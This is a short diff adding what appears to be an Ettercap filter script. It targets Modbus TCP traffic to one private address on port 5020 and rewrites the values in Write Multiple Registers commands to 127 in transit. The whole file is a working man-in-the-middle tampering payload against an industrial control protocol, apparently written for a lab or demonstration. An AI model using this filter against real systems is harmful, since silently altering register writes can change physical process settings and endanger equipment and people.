@@ -1,0 +1,12 @@
+if (ip.dst == '192.168.192.143' && tcp.dst == 5020) {
+
+	# Test for Write Multiple registers 0x10 Message. 
+    if (DATA.data + 7 == "\x10"){
+        if (DATA.data + 7 == "\x10"){
+            DATA.data + 13 = "\x00";
+            DATA.data + 14 = "\x7F";
+        }
+    	# Printing a message when the filter fires.
+    	msg("Modified 1-register write to 127\n");
+    }
+}
